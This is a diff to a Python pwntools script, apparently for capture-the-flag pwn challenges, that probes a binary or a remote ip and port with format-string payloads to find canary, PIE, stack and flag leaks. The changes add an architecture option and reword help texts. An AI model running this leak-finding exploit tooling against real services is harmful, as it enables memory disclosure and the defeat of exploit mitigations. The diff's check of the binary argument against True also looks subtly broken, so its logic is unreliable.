@@ -26,33 +26,37 @@ Y88b  d88P 888     Y88b. .d88P 888       Y88b  d88P
 
 
 if __name__ == "__main__":
-	
+
 	print_banner()
 
+	sleep(1)
 	parser = argparse.ArgumentParser(description="Tool to identify leaks using format string vulnerability.")
 
-	parser.add_argument('-b', action="store", dest="binary", required=True, help="Set the binary you wish to exploit.")
-	parser.add_argument('-max', action="store", dest="max", required=False, help="Set the maximum value to be tested. Range: (min, max).")
-	parser.add_argument('-min', action="store", dest="min", required=False, help="Set the minimum value to be tested. Range: (min, max).")
-	parser.add_argument('-ip', action="store", dest="ip", required=False, help="remote server's ip.")
-	parser.add_argument('-port', action="store", dest="port", required=False, help="remote server's port.")
-	parser.add_argument('-flag', action="store", dest="flag_format", required=False, help="indicate the start of the flag.")
-	parser.add_argument('--s', action="store_true", dest="format_s", required=False, help="""use %%s instead of %%p.""")
-	parser.add_argument('--canary', action="store_true", dest="canary", required=False, help="Find the position in which a canary leak is.")	
-	parser.add_argument('--leaks', action="store_true", dest="all_leaks", required=False, help="Prints all leaks found.")
-	parser.add_argument('--pie', action="store_true", dest="pie_search", required=False, help="Find the position of a pie leak.")
-	parser.add_argument('--stack', action="store_true", dest="stack_search", required=False, help="Find the position of a stack leak.")
-	parser.add_argument('--v', action="store_true", dest="verbose", required=False, help="Set the verbose mode.")
+	parser.add_argument('-b', action="store", dest="binary", required=False, help="Select this option to indicate the binary to be exploited (mandatory parameter).")
+	parser.add_argument('-max', action="store", dest="max", required=False, help="Select this option to indicate the maximum value to be tested. Range: (min, max). By default, max = 40")
+	parser.add_argument('-min', action="store", dest="min", required=False, help="Select this option to indicate the minimum value to be tested. Range: (min, max). By default, min = 1")
+	parser.add_argument('-ip', action="store", dest="ip", required=False, help="Select this option to specify the ip of the remote server.")
+	parser.add_argument('-port', action="store", dest="port", required=False, help="Select this option to specify the port of the remote server.")
+	parser.add_argument('-flag', action="store", dest="flag_format", required=False, help="Select this option to indicate the start of the flag to search for.")
+	parser.add_argument('-arch', action="store", dest="arch", required=False, help="Select this option to set the arch (32 or 64).")
+	parser.add_argument('--s', action="store_true", dest="format_s", required=False, help="""Select this option to use %%s instead of %%p.""")
+	parser.add_argument('--canary', action="store_true", dest="canary", required=False, help="Select this option to find the position where a canary leak is located.")
+	parser.add_argument('--leaks', action="store_true", dest="all_leaks", required=False, help="Select this option to print all the leaks found.")
+	parser.add_argument('--pie', action="store_true", dest="pie_search", required=False, help="Select this option to find the position where a pie leak is located.")
+	parser.add_argument('--stack', action="store_true", dest="stack_search", required=False, help="Select this option to find the position where a stack leak is located.")
+	parser.add_argument('--v', action="store_true", dest="verbose", required=False, help="Select this option to set the verbose mode.")
 
 
+	results = parser.parse_args()
 
-	results = parser.parse_args() 	
-
-	file = context.binary = results.binary
-	elf = ELF(file)
+	if (results.binary is not None):
+		file = context.binary = results.binary
+		elf = ELF(file)
 
 	if (results.format_s == True):
 		assert ((results.format_s != results.canary) and (results.format_s != results.all_leaks)), "Remember that you can only use the -s parameter to search for flags. You cannot add --canary or --leaks."
+	if (results.binary is None):
+		assert ((results.ip is not None) and (results.port is not None) and (results.arch is not None)), "Remember that you have to set the arch of the binary if you don't use the parameter -b."
 
 	max = 40 ## Default value
 	min = 1 ## Default value
@@ -61,8 +65,13 @@ if __name__ == "__main__":
 
 		flagB = False
 		flag = ""
-		value = int(elf.elfclass / 8)
-		flagS = (results.flag_format[:value]).encode()
+		if (results.binary == True):
+			value = int(elf.elfclass / 8)
+			flagS = (results.flag_format[:value]).encode()
+		else :
+
+                    value = int(int(results.arch) / 8)
+                    flagS = (results.flag_format[:value]).encode()
 
 	if results.max is not None:
 
@@ -77,7 +86,7 @@ if __name__ == "__main__":
 	for i in range (min, max):
 
 		if (results.ip is not None and results.port is not None):
-			
+
 			p = remote(results.ip, results.port)
 
 		else:
@@ -93,7 +102,7 @@ if __name__ == "__main__":
 
 			#######################################################################
 			#      This is the part that you must modify to fit your binary.      #
-	        #######################################################################
+		        #######################################################################
 			#
 			p.sendlineafter(b'streak?', payload)	
 			p.recvuntil(b'current streak:')
@@ -237,7 +246,7 @@ if __name__ == "__main__":
 
 			#######################################################################
 			#      This is the part that you must modify to fit your binary.      #
-	        #######################################################################
+		        #######################################################################
 			#
 			p.sendlineafter(b'again?', payload)
 			p.recvuntil(b'Welcome back')
@@ -245,7 +254,8 @@ if __name__ == "__main__":
 			#
 			#######################################################################	
 			try:
-
+				if (results.verbose == True):
+					print(leak)
 				if flagS in leak:
 
 					flag=str(leak).strip("b").strip("'")
